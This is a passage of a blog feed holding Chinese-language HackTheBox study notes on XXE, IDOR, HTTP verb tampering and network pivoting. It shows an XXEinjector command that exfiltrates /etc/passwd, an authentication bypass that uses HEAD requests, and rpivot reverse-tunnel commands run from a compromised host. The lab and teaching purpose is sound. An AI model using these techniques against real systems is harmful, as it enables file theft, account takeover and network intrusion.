Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)Content-Type: text/plain;charset=UTF-8Accept: */*Origin: http://10.129.201.94Referer: http://10.129.201.94/blind/Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9Connection: close&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;XXEINJECT</code></pre><p>现在，我们可以运行该工具，–host&#x2F;-httpport标志是我们的IP和端口，–file标志是我们上面写的文件，–path标志是我们想要读取的文件。我们还将选择–oob&#x3D;http和–phpfilter标志来重复我们上面所做的oob攻击，如下所示：</p><pre><code class="shell-session">Tanin@htb[/htb]$ ruby XXEinjector.rb --host=127.0.0.1 --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter...SNIP...[+] Sending request with malicious XML.[+] Responding with XML for: /etc/passwd[+] Retrieved data:</code></pre><p>我们看到该工具没有直接打印数据。这是因为我们对数据进行base64编码，所以它不会被打印出来。在任何情况下，所有经过过滤的文件都会存储在该工具下的Logs文件夹中，我们可以在那里找到我们的文件：</p><pre><code class="shell-session">Tanin@htb[/htb]$ cat Logs/10.129.201.94/etc/passwd.log root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin...SNIP..</code></pre><h1 id="XXE-Prevention"><a href="#XXE-Prevention" class="headerlink" title="XXE Prevention"></a>XXE Prevention</h1><p>除了使用最新的XML库之外，web应用程序的某些XML配置还有助于降低XXE被利用的可能性。其中包括： </p><p>禁用引用自定义文档类型定义（DTD） </p><p>禁用引用外部XML实体 禁用参数实体处理 禁用对XInclude的支持</p><p> 防止实体引用循环 </p><p>我们看到的另一件事是基于错误的XXE利用。因此，我们应该在web应用程序中始终有适当的异常处理，并且应该始终禁用在web服务器中显示运行时错误。 如果我们错过了更新某些XML库，这样的配置应该是另一层保护，并且还应该防止XXE被利用。然而，在这种情况下，我们可能仍然使用易受攻击的库，并且只应用防止利用的变通方法，这并不理想。 由于XML数据引入了各种问题和漏洞，许多人还建议使用其他格式，如JSON或YAML。这还包括避免使用依赖XML（例如SOAP）的API标准，而使用基于JSON的API（例如REST）。 最后，使用Web应用程序防火墙（WAF）是防止XXE利用的另一层保护措施。然而，我们永远不应该完全依赖WAF，让后端变得脆弱，因为WAF总是可以绕过的。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Intro-to-XXE&quot;&gt;&lt;a href=&quot;#Intro-to-XXE&quot; class=&quot;headerlink&quot; title=&quot;Intro to XXE&quot;&gt;&lt;/a&gt;Intro to XXE&lt;/h1&gt;&lt;p&gt;XML外部实体（XXE）注入漏洞发生在从用户控制的输入中获取XML数据时，而没有对其进行适当的清理或安全解析，这可能使我们能够使用XML功能执行恶意操作。XXE漏洞会对web应用程序及其后端服务器造成相当大的损害，从泄露敏感文件到关闭后端服务器，这就是为什么它被OWASP认为是十大web安全风险之一。&lt;/p&gt;</summary>
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
  </entry>
  
  <entry>
    <title>Web Attacks-IDOR</title>
    <link href="https://taninluv.github.io/2023/09/06/Web-Attacks-IDOR/"/>
    <id>https://taninluv.github.io/2023/09/06/Web-Attacks-IDOR/</id>
    <published>2023-09-06T08:21:28.000Z</published>
    <updated>2023-09-11T06:58:58.136Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Intro-to-IDOR"><a href="#Intro-to-IDOR" class="headerlink" title="Intro to IDOR"></a>Intro to IDOR</h1><p>不安全的直接对象引用（IDOR）漏洞是最常见的web漏洞之一，会严重影响易受攻击的web应用程序。当web应用程序暴露对对象（如文件或数据库资源）的直接引用时，就会出现IDOR漏洞，最终用户可以直接控制该对象以获得对其他类似对象的访问权限。如果由于缺乏可靠的访问控制系统，任何用户都可以访问任何资源，则该系统被认为是易受攻击的。 构建一个可靠的访问控制系统非常具有挑战性，这就是IDOR漏洞普遍存在的原因。此外，自动化识别访问控制系统弱点的过程也相当困难，这可能导致这些弱点在进入生产之前一直无法识别。 例如，如果用户请求访问他们最近上传的文件，他们可能会得到一个链接，例如（download.php？file_id&#x3D;123）。因此，由于链接直接引用了带有（file_id&#x3D;122）的文件，如果我们试图用（download.php！file_id&#x3D;124）访问另一个文件（可能不属于我们），会发生什么？如果web应用程序在后端没有适当的访问控制系统，我们可以通过发送带有file_id的请求来访问任何文件。在许多情况下，我们可能会发现id很容易被猜测，从而可以根据我们的权限检索许多我们不应该访问的文件或资源。</p><h2 id="What-Makes-an-IDOR-Vulnerability"><a href="#What-Makes-an-IDOR-Vulnerability" class="headerlink" title="What Makes an IDOR Vulnerability"></a>What Makes an IDOR Vulnerability</h2><p>仅仅公开对内部对象或资源的直接引用本身并不是一个漏洞。然而，这可能会使利用另一个漏洞成为可能：弱访问控制系统。许多web应用程序通过限制用户访问可以检索这些资源的页面、函数和API来限制用户访问资源。然而，如果用户以某种方式访问了这些页面（例如，通过共享&#x2F;猜测的链接），会发生什么？他们仍然能够通过简单的链接访问相同的资源吗？如果web应用程序的后端没有访问控制系统来比较用户的身份验证和资源的访问列表，那么他们可能能够。<br>有许多方法可以实现用于web应用程序的可靠访问控制系统，例如具有基于角色的访问控制（RBAC）系统。主要结论是，IDOR漏洞的存在主要是由于后端缺乏访问控制。如果用户直接引用了缺乏访问控制的web应用程序中的对象，攻击者就有可能查看或修改其他用户的数据。<br>许多开发人员忽略了构建访问控制系统；因此，大多数web应用程序和移动应用程序在后端都没有受到保护。在这样的应用程序中，所有用户都可以任意访问后端上的所有其他用户的数据。阻止用户访问其他用户数据的唯一方法是应用程序的前端实现，该应用程序旨在只显示用户的数据。在这种情况下，手动操作HTTP请求可能会显示所有用户都可以完全访问所有数据，从而导致成功的攻击。<br>所有这些都使IDOR漏洞成为任何web或移动应用程序最关键的漏洞之一，这不仅是因为暴露了直接的对象引用，而且主要是因为缺乏可靠的访问控制系统。即使是一个基本的访问控制系统也很难开发。一个覆盖整个web应用程序而不干扰其功能的全面访问控制系统可能是一项更困难的任务。</p><h2 id="practice"><a href="#practice" class="headerlink" title="practice"></a>practice</h2><p> Try to read the details of the user with ‘uid&#x3D;5’. What is their ‘uuid’ value?</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309110933889.png" alt="image-20230911093346827"></p><p>抓包后提交的信息稍微多，我们先修改uid，发现返回：</p><pre><code>uid mismatch</code></pre><p>他似乎把接口与uid相对应起来，我们同时更改接口号为2：</p><pre><code>uuid mismatch</code></pre><p>正如我们所看到的，这一次，我们收到一条错误消息，说uuid不匹配。web应用程序似乎正在检查我们发送的uuid值是否与用户的uuid匹配。由于我们正在发送自己的uuid，因此我们的请求失败了。这似乎是防止用户更改其他用户详细信息的另一种访问控制形式。 接下来，让我们看看是否可以创建一个向API端点发出POST请求的新用户。我们可以将请求方法更改为POST，将uid更改为新的uid，并将请求发送到新uid的API端点：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309110940315.png" alt="image-20230911094045276"></p><p>尝试将我们的角色更改为admin&#x2F;administrator以获得更高的权限。不幸的是，在不知道有效角色名称的情况下，我们在HTTP响应中得到无效角色</p><p>此时我们发现uid与接口号是相对应的，我们尝试像端口5发送get请求：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309110945977.png" alt="image-20230911094538943"></p><p>拿到uuid</p><h1 id="Chaining-IDOR-Vulnerabilities"><a href="#Chaining-IDOR-Vulnerabilities" class="headerlink" title="Chaining IDOR Vulnerabilities"></a>Chaining IDOR Vulnerabilities</h1><p>通常，对API端点的GET请求应该返回被请求用户的详细信息，因此我们可以尝试调用它来查看是否可以检索用户的详细内容。我们还注意到，页面加载后，它会通过向同一API端点的GET请求获取用户详细信息：</p><p>如前一节所述，我们的HTTP请求中唯一的授权形式是role&#x3D;employee cookie，因为HTTP请求不包含任何其他形式的用户特定授权，例如JWT令牌。即使令牌确实存在，除非后端访问控制系统将其与请求的对象详细信息进行主动比较，否则我们仍然可以检索其他用户的详细信息。</p><h2 id="Information-Disclosure"><a href="#Information-Disclosure" class="headerlink" title="Information Disclosure"></a>Information Disclosure</h2><h2 id="Modifying-Other-Users’-Details"><a href="#Modifying-Other-Users’-Details" class="headerlink" title="Modifying Other Users’ Details"></a>Modifying Other Users’ Details</h2><p>除了允许我们查看潜在的敏感细节外，修改另一个用户的详细信息的能力还使我们能够执行其他几种攻击。一种类型的攻击是修改用户的电子邮件地址，然后请求密码重置链接，该链接将发送到我们指定的电子邮件地址中，从而使我们能够控制他们的帐户。另一种潜在的攻击是在“about”字段中放置XSS有效载荷，一旦用户访问其编辑配置文件页面，就会执行该有效载荷，使我们能够以不同的方式攻击用户。</p><h2 id="Chaining-Two-IDOR-Vulnerabilities"><a href="#Chaining-Two-IDOR-Vulnerabilities" class="headerlink" title="Chaining Two IDOR Vulnerabilities"></a>Chaining Two IDOR Vulnerabilities</h2><p>由于我们发现了IDOR Information Disclosure漏洞，我们还可以枚举所有用户并查找其他角色，最好是管理员角色。尝试编写一个脚本来枚举所有用户，类似于我们之前所做的操作。 一旦我们枚举了所有用户，我们将找到一个具有以下详细信息的管理员用户：</p><p>通过将我们从IDOR information Disclosure漏洞获得的信息与API端点上的IDOR Insecure Function Calls攻击相结合，我们可以修改其他用户的详细信息并创建&#x2F;删除用户，同时绕过各种访问控制检查。在许多情况下，我们通过IDOR漏洞泄露的信息可以用于其他攻击，如IDOR或XSS，从而导致更复杂的攻击或绕过现有的安全机制。 有了我们的新角色，我们还可以执行批量分配来更改所有用户的特定字段，比如在他们的配置文件中放置XSS有效载荷，或者将他们的电子邮件更改为我们指定的电子邮件。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Intro-to-IDOR&quot;&gt;&lt;a href=&quot;#Intro-to-IDOR&quot; class=&quot;headerlink&quot; title=&quot;Intro to IDOR&quot;&gt;&lt;/a&gt;Intro to IDOR&lt;/h1&gt;&lt;p&gt;不安全的直接对象引用（IDOR）漏洞是最常见的web</summary>
      
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
  </entry>
  
  <entry>
    <title>Web Attacks-HTTP Verb Tampering</title>
    <link href="https://taninluv.github.io/2023/09/06/Web-Attacks/"/>
    <id>https://taninluv.github.io/2023/09/06/Web-Attacks/</id>
    <published>2023-09-06T06:52:16.000Z</published>
    <updated>2023-09-06T08:17:32.538Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Intro-to-HTTP-Verb-Tampering"><a href="#Intro-to-HTTP-Verb-Tampering" class="headerlink" title="Intro to HTTP Verb Tampering"></a>Intro to HTTP Verb Tampering</h1><p>HTTP协议的工作原理是在HTTP请求开始时接受各种HTTP方法作为谓词。根据web服务器配置，可以编写web应用程序的脚本以接受用于其各种功能的特定HTTP方法，并基于请求的类型执行特定操作。 虽然程序员主要考虑两种最常用的HTTP方法，GET和POST，但任何客户端都可以在其HTTP请求中发送任何其他方法，然后查看web服务器如何处理这些方法。假设web应用程序和后端web服务器都被配置为只接受GET和POST请求。在这种情况下，发送不同的请求将导致显示web服务器错误页面，这本身并不是一个严重的漏洞（除了提供糟糕的用户体验并可能导致信息泄露之外）。另一方面，如果web服务器配置不限于仅接受web服务器所需的HTTP方法（例如GET&#x2F;POST），并且web应用程序没有被开发为处理其他类型的HTTP请求（例如HEAD、PUT），那么我们可能能够利用这种不安全的配置来访问我们无法访问的功能，或者甚至绕过某些安全控制。</p><span id="more"></span><h2 id="HTTP-Verb-Tampering"><a href="#HTTP-Verb-Tampering" class="headerlink" title="HTTP Verb Tampering"></a>HTTP Verb Tampering</h2><p> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods">9 different verbs</a></p><p>可以想象，上面的一些方法可以执行非常敏感的功能，比如将（PUT）或删除（DELETE）文件写入后端服务器上的webroot目录。正如Web请求模块中所讨论的，如果Web服务器没有安全地配置为管理这些方法，我们可以使用它们来控制后端服务器。然而，HTTP谓词篡改攻击更常见（因此更为关键）的原因是，它们是由后端web服务器或web应用程序中的错误配置引起的，这两者都可能导致漏洞。</p><h2 id="Insecure-Configurations"><a href="#Insecure-Configurations" class="headerlink" title="Insecure Configurations"></a>Insecure Configurations</h2><p>不安全的web服务器配置导致第一类HTTP谓词篡改漏洞。web服务器的身份验证配置可能仅限于特定的HTTP方法，这将使一些HTTP方法在没有身份验证的情况下可以访问。例如，系统管理员可以使用以下配置要求对特定网页进行身份验证：</p><pre><code class="xml">&lt;Limit GET POST&gt;    Require valid-user&lt;/Limit&gt;</code></pre><p>正如我们所看到的，即使配置为身份验证方法指定了GET和POST请求，攻击者仍然可能使用不同的HTTP方法（如HEAD）来完全绕过此身份验证机制，这将在下一节中看到。这最终导致身份验证绕过，并允许攻击者访问他们不应该访问的网页和域。</p><h2 id="Insecure-Coding"><a href="#Insecure-Coding" class="headerlink" title="Insecure Coding"></a>Insecure Coding</h2><p>不安全的编码实践会导致其他类型的HTTP谓词篡改漏洞（尽管有些人可能不考虑这种谓词篡改）。当web开发人员应用特定的过滤器来减轻特定的漏洞，而不使用该过滤器覆盖所有HTTP方法时，就会发生这种情况。例如，如果发现某个网页易受SQL注入漏洞的攻击，并且后端开发人员通过以下应用输入净化筛选器来减轻SQL注入漏洞：</p><pre><code class="php">$pattern = &quot;/^[A-Za-z\s]+$/&quot;;if(preg_match($pattern, $_GET[&quot;code&quot;])) &#123;    $query = &quot;Select * from ports where port_code like &#39;%&quot; . $_REQUEST[&quot;code&quot;] . &quot;%&#39;&quot;;    ...SNIP...&#125;</code></pre><p>我们可以看到，过滤器&#x3D;&#x3D;只在GET参数&#x3D;&#x3D;上进行测试。如果GET请求不包含任何坏字符，那么将执行查询。但是，在执行查询时，会使用$_REQUEST[“code”]参数，这些参数也可能包含POST参数，从而导致HTTP谓词的使用不一致。在这种情况下，攻击者可能会使用POST请求来执行SQL注入，在这种情况中，GET参数将为空（不包括任何坏字符）。该请求将通过安全过滤器，这将使函数仍然容易受到SQL注入的攻击。 虽然上述两个漏洞都是在公共场合发现的，但第二个漏洞要常见得多，因为它是由于编码错误造成的，而第一个漏洞通常可以通过安全的web服务器配置来避免，因为文档经常警告不要这样做。在接下来的部分中，我们将看到这两种类型的示例以及如何利用它们。</p><h1 id="Bypassing-Basic-Authentication"><a href="#Bypassing-Basic-Authentication" class="headerlink" title="Bypassing Basic Authentication"></a>Bypassing Basic Authentication</h1><p>利用HTTP谓词篡改漏洞通常是一个相对简单的过程。我们只需要尝试其他HTTP方法，看看web服务器和web应用程序是如何处理它们的。虽然许多自动漏洞扫描工具可以一致地识别由不安全的服务器配置引起的HTTP Verb篡改漏洞，但它们通常无法识别由不可靠的编码引起的HTTP篡改漏洞。这是因为一旦我们绕过身份验证页面，第一种类型就可以很容易地识别出来，而另一种类型则需要主动测试，看看我们是否可以绕过现有的安全过滤器。 第一种类型的HTTP谓词篡改漏洞主要由不安全的Web服务器配置引起，利用该漏洞可以绕过某些页面上的HTTP基本身份验证提示。</p><h2 id="Identify"><a href="#Identify" class="headerlink" title="Identify"></a>Identify</h2><p>当我们在本节结束时开始练习时，我们看到我们有一个基本的File Manager web应用程序，在其中我们可以通过键入新文件的名称并点击enter来添加新文件：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309061525315.jpeg" alt="img"></p><p>但是，假设我们试图通过单击红色的“重置”按钮来删除所有文件。在这种情况下，我们看到该功能似乎仅限于经过身份验证的用户，因为我们得到了以下HTTP基本身份验证提示：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309061525778.jpeg" alt="img"></p><p>由于我们没有任何凭据，我们将获得一个401未经授权的页面：由于我们没有任何凭据，我们将获得一个401未经授权的页面</p><p>所以，让我们看看我们是否可以通过HTTP动词篡改攻击绕过这一点。为此，我们需要确定哪些页面受到此身份验证的限制。如果我们在点击Reset按钮后检查HTTP请求，或者在点击该按钮后查看该按钮导航到的URL，我们会发现它位于&#x2F;admin&#x2F;Reset.php。因此，&#x2F;admin目录仅限于经过身份验证的用户，或者只有&#x2F;admin&#x2F;recet.php页面。我们可以通过访问&#x2F;admin目录来确认这一点，并且确实会提示我们再次登录。这意味着完整的&#x2F;admin目录受到限制。</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>为了尝试利用该页面，我们需要确定web应用程序使用的HTTP请求方法。我们可以在Burp Suite中拦截请求并进行检查：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309061525863.jpeg" alt="unauthorized_request"></p><p>由于页面使用GET请求，我们可以发送POST请求，并查看网页是否允许POST请求（即验证是否涵盖POST请求）。要做到这一点，我们可以右键点击Burp中拦截的请求，然后选择Change request Method，它会自动将请求更改为POST请求：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309061526919.jpeg" alt="change_request"></p><p>完成后，我们可以单击“前进”并在浏览器中查看页面。不幸的是，如果我们不提供凭据，我们仍然会被提示登录，并将获得401未经授权的页面：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309061526326.jpeg" alt="img"></p><p>因此，web服务器配置似乎同时涵盖了GET和POST请求。然而，正如我们之前所了解到的，我们可以使用许多其他HTTP方法，最显著的是HEAD方法，它与GET请求相同，但不会在HTTP响应中返回正文。如果成功，我们可能不会收到任何输出，但重置功能仍应执行，这是我们的主要目标。 要查看服务器是否接受HEAD请求，我们可以向其发送OPTIONS请求，并查看接受了哪些HTTP方法，如下所示：</p><pre><code class="shell-session">Tanin@htb[/htb]$ curl -i -X OPTIONS http://SERVER_IP:PORT/HTTP/1.1 200 OKDate: Server: Apache/2.4.41 (Ubuntu)Allow: POST,OPTIONS,HEAD,GETContent-Length: 0Content-Type: httpd/unix-directory</code></pre><p>正如我们所看到的，响应显示Allow:POST、OPTIONS、HEAD、GET，这意味着web服务器确实接受HEAD请求，这是许多web服务器的默认配置。因此，让我们再次尝试拦截重置请求，这次使用HEAD请求来查看web服务器如何处理它：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309061529974.jpeg" alt="HEAD_request"></p><p>一旦我们将POST更改为HEAD并转发请求，我们将看到我们不再得到登录提示或401未授权页面，而是得到一个空输出，正如HEAD请求所预期的那样。如果我们返回到File Manager web应用程序，我们将看到所有文件确实已被删除，这意味着我们在没有管理员访问权限或任何凭据的情况下成功触发了重置功能：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309061529688.jpeg" alt="img"></p><h1 id="Bypassing-Security-Filters"><a href="#Bypassing-Security-Filters" class="headerlink" title="Bypassing Security Filters"></a>Bypassing Security Filters</h1><p>另一种更常见的HTTP谓词篡改漏洞是由web应用程序开发过程中出现的不安全编码错误引起的，这导致web应用程序无法覆盖某些功能中的所有HTTP方法。这通常出现在检测恶意请求的安全筛选器中。例如，如果安全过滤器用于检测注入漏洞，并且只检查POST参数（例如$_POST[参数]）中的注入，则可以通过将请求方法更改为GET来绕过它。</p><p>为了避免我们的代码中存在HTTP Verb篡改漏洞，我们必须与HTTP方法的使用保持一致，并确保相同的方法始终用于整个web应用程序的任何特定功能。始终建议通过测试所有请求参数来扩大安全筛选器中的测试范围。这可以通过以下函数和变量来实现：</p><table><thead><tr><th>Language</th><th>Function</th></tr></thead><tbody><tr><td>PHP</td><td><code>$_REQUEST[&#39;param&#39;]</code></td></tr><tr><td>Java</td><td><code>request.getParameter(&#39;param&#39;)</code></td></tr><tr><td>C#</td><td><code>Request[&#39;param&#39;]</code></td></tr></tbody></table>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Intro-to-HTTP-Verb-Tampering&quot;&gt;&lt;a href=&quot;#Intro-to-HTTP-Verb-Tampering&quot; class=&quot;headerlink&quot; title=&quot;Intro to HTTP Verb Tampering&quot;&gt;&lt;/a&gt;Intro to HTTP Verb Tampering&lt;/h1&gt;&lt;p&gt;HTTP协议的工作原理是在HTTP请求开始时接受各种HTTP方法作为谓词。根据web服务器配置，可以编写web应用程序的脚本以接受用于其各种功能的特定HTTP方法，并基于请求的类型执行特定操作。 虽然程序员主要考虑两种最常用的HTTP方法，GET和POST，但任何客户端都可以在其HTTP请求中发送任何其他方法，然后查看web服务器如何处理这些方法。假设web应用程序和后端web服务器都被配置为只接受GET和POST请求。在这种情况下，发送不同的请求将导致显示web服务器错误页面，这本身并不是一个严重的漏洞（除了提供糟糕的用户体验并可能导致信息泄露之外）。另一方面，如果web服务器配置不限于仅接受web服务器所需的HTTP方法（例如GET&amp;#x2F;POST），并且web应用程序没有被开发为处理其他类型的HTTP请求（例如HEAD、PUT），那么我们可能能够利用这种不安全的配置来访问我们无法访问的功能，或者甚至绕过某些安全控制。&lt;/p&gt;</summary>
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
  </entry>
  
  <entry>
    <title>Pivoting Around Obstacles &amp; Branching Out Our Tunnels</title>
    <link href="https://taninluv.github.io/2023/09/03/Pivoting-Around-Obstacles/"/>
    <id>https://taninluv.github.io/2023/09/03/Pivoting-Around-Obstacles/</id>
    <published>2023-09-03T08:08:15.000Z</published>
    <updated>2023-09-04T09:56:03.824Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SSH-for-Windows-plink-exe"><a href="#SSH-for-Windows-plink-exe" class="headerlink" title="SSH for Windows: plink.exe"></a>SSH for Windows: plink.exe</h1><p><a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html">Plink</a>PuTTY Link的缩写，是一个Windows命令行SSH工具，安装时作为PuTTY包的一部分。与SSH类似，Plink也可以用于创建动态端口转发和SOCKS代理。在2018年秋季之前，Windows没有包含本地ssh客户端，因此用户必须安装自己的ssh客户端。对于许多需要连接到其他主机的系统管理员来说，选择的工具是 <a href="https://www.putty.org/">PuTTY</a>。</p><p>如果我们使用Windows系统而不是基于Linux的系统作为主要攻击主机，我们也可以使用Plink。</p><h2 id="Getting-To-Know-Plink"><a href="#Getting-To-Know-Plink" class="headerlink" title="Getting To Know Plink"></a>Getting To Know Plink</h2><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309031617228.png" alt="img"></p><p>Windows攻击主机使用以下命令行参数启动plink.exe进程，以在Ubuntu服务器上启动动态端口转发。这启动了Windows攻击主机和Ubuntu服务器之间的SSH会话，然后plink开始在端口9050上侦听。</p><pre><code class="cmd-session">plink -D 9050 ubuntu@10.129.15.50</code></pre><p>另一个名为 <a href="https://www.proxifier.com/">Proxifier</a>的基于Windows的工具可以用于通过我们创建的SSH会话启动SOCKS隧道。Proxifier是一个Windows工具，它为桌面客户端应用程序创建隧道网络，允许它通过SOCKS或HTTPS代理进行操作，并允许代理链接。可以创建一个配置文件，在其中我们可以为Plink在端口9050上启动的SOCKS服务器提供配置。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309031619809.png" alt="img"></p><p>在为127.0.0.1和端口9050配置SOCKS服务器后，我们可以直接启动mstsc.exe来启动与允许RDP连接的Windows目标的RDP会话。</p><h1 id="SSH-Pivoting-with-Sshuttle"><a href="#SSH-Pivoting-with-Sshuttle" class="headerlink" title="SSH Pivoting with Sshuttle"></a>SSH Pivoting with Sshuttle</h1><p><a href="https://github.com/sshuttle/sshuttle">Sshuttle</a>是另一个用Python编写的工具，它消除了配置proxychain的需要。但是，此工具仅适用于通过SSH进行数据透视，而不提供通过TOR或HTTPS代理服务器进行数据透视的其他选项。Sshuttle对于自动执行iptables和为远程主机添加数据透视规则非常有用。我们可以将Ubuntu服务器配置为一个支点，并使用本节稍后的示例使用sshuttle路由Nmap的所有网络流量。 sshuttle的一个有趣用法是，我们不需要使用proxychans来连接到远程主机。让我们通过Ubuntu pivot主机安装sshuttle，并将其配置为通过RDP连接到Windows主机。</p><h4 id="Installing-sshuttle"><a href="#Installing-sshuttle" class="headerlink" title="Installing sshuttle"></a>Installing sshuttle</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo apt-get install sshuttle</code></pre><p>要使用sshuttle，我们指定选项-r以使用用户名和密码连接到远程机器。然后，我们需要包括我们想要通过枢轴主机路由的网络或IP，在我们的情况下，是网络172.16.5.0&#x2F;23。</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v </code></pre><p>使用此命令，sshuttle在我们的iptables中创建一个条目，通过pivot主机将所有流量重定向到172.16.5.0&#x2F;23网络。</p><h4 id="Traffic-Routing-through-iptables-Routes"><a href="#Traffic-Routing-through-iptables-Routes" class="headerlink" title="Traffic Routing through iptables Routes"></a>Traffic Routing through iptables Routes</h4><pre><code class="shell-session">Tanin@htb[/htb]$ nmap -v -sV -p3389 172.16.5.19 -A -Pn</code></pre><p>我们现在可以直接使用任何工具，而无需使用proxychains。</p><blockquote><p>xfreerdp 默认情况下可能不信任自签名证书<code>/cert-ignore</code> 选项会忽略证书验证错误。</p></blockquote><h1 id="Web-Server-Pivoting-with-Rpivot"><a href="#Web-Server-Pivoting-with-Rpivot" class="headerlink" title="Web Server Pivoting with Rpivot"></a>Web Server Pivoting with Rpivot</h1><p><a href="https://github.com/klsecservices/rpivot">Rpivot</a></p><p>Rpivot是一个用Python编写的用于SOCKS隧道的反向SOCKS代理工具。Rpivot将公司网络内的计算机绑定到外部服务器，并在服务器端公开客户端的本地端口。我们将采用下面的场景，在我们的内部网络上有一个web服务器（172.16.5.135），我们想使用rpivot代理访问它。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309031654234.png" alt="img"></p><p>我们可以使用以下命令启动rpivot SOCKS代理服务器，以允许客户端在端口9999上连接，并在端口9050上侦听代理枢轴连接。</p><h4 id="Cloning-rpivot"><a href="#Cloning-rpivot" class="headerlink" title="Cloning rpivot"></a>Cloning rpivot</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo git clone https://github.com/klsecservices/rpivot.git</code></pre><p>我们可以启动rpivot SOCKS代理服务器，使用server.py连接到受损的Ubuntu服务器上的客户端。</p><pre><code class="shell-session">Running server.py from the Attack HostTanin@htb[/htb]$ python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0</code></pre><p>在运行client.py之前，我们需要将rpivot传输到目标。我们可以使用此SCP命令执行此操作：</p><h4 id="Transfering-rpivot-to-the-Target"><a href="#Transfering-rpivot-to-the-Target" class="headerlink" title="Transfering rpivot to the Target"></a>Transfering rpivot to the Target</h4><pre><code class="shell-session">Tanin@htb[/htb]$ scp -r rpivot ubuntu@&lt;IpaddressOfTarget&gt;:/home/ubuntu/</code></pre><h4 id="Running-client-py-from-Pivot-Target"><a href="#Running-client-py-from-Pivot-Target" class="headerlink" title="Running client.py from Pivot Target"></a>Running client.py from Pivot Target</h4><pre><code class="shell-session">ubuntu@WEB01:~/rpivot$ python2.7 client.py --server-ip 10.10.14.18 --server-port 9999Backconnecting to server 10.10.14.18 port 9999</code></pre><h4 id="Confirming-Connection-is-Established"><a href="#Confirming-Connection-is-Established" class="headerlink" title="Confirming Connection is Established"></a>Confirming Connection is Established</h4><pre><code class="shell-session">New connection from host 10.129.202.64, source port 35226</code></pre><p>我们将在我们的攻击主机127.0.0.1:9050上配置proxychans以在本地服务器上进行转移，该攻击主机最初是由Python服务器启动的。 最后，我们应该能够使用proxychains和Firefox访问服务器端的Web服务器，该服务器托管在172.16.5.0&#x2F;23的内部网络上，172.16.5.135:80。</p><h4 id="Browsing-to-the-Target-Webserver-using-Proxychains"><a href="#Browsing-to-the-Target-Webserver-using-Proxychains" class="headerlink" title="Browsing to the Target Webserver using Proxychains"></a>Browsing to the Target Webserver using Proxychains</h4><pre><code class="shell-session">proxychains firefox-esr 172.16.5.135:80</code></pre><p>与上面的pivot代理类似，在某些情况下，我们可能无法直接转向云上的外部服务器（攻击主机）。某些组织使用域控制器配置了 <a href="https://docs.microsoft.com/en-us/openspecs/office_protocols/ms-grvhenc/b9e676e7-e787-4020-9840-7cfe7c76044a">HTTP-proxy with NTLM authentication</a>。在这种情况下，我们可以为rpivot提供一个额外的NTLM身份验证选项，通过提供用户名和密码来通过NTLM代理进行身份验证。在这些情况下，我们可以通过以下方式使用rpivot的client.py：</p><h4 id="Connecting-to-a-Web-Server-using-HTTP-Proxy-amp-NTLM-Auth"><a href="#Connecting-to-a-Web-Server-using-HTTP-Proxy-amp-NTLM-Auth" class="headerlink" title="Connecting to a Web Server using HTTP-Proxy &amp; NTLM Auth"></a>Connecting to a Web Server using HTTP-Proxy &amp; NTLM Auth</h4><pre><code class="shell-session">python client.py --server-ip &lt;IPaddressofTargetWebServer&gt; --server-port 8080 --ntlm-proxy-ip &lt;IPaddressofProxy&gt; --ntlm-proxy-port 8081 --domain &lt;nameofWindowsDomain&gt; --username &lt;username&gt; --password &lt;password&gt;</code></pre><h1 id="Branching-Out-Our-Tunnels"><a href="#Branching-Out-Our-Tunnels" class="headerlink" title="Branching Out Our Tunnels"></a>Branching Out Our Tunnels</h1><h1 id="DNS-Tunneling-with-Dnscat2"><a href="#DNS-Tunneling-with-Dnscat2" class="headerlink" title="DNS Tunneling with Dnscat2"></a>DNS Tunneling with Dnscat2</h1><p><a href="https://github.com/iagox86/dnscat2">Dnscat2</a></p><p>Dnscat2是一种隧道工具，使用DNS协议在两个主机之间发送数据。它使用加密的命令和控制（C&amp;C或C2）通道，并在DNS协议内的TXT记录内发送数据。通常，公司网络中的每个active 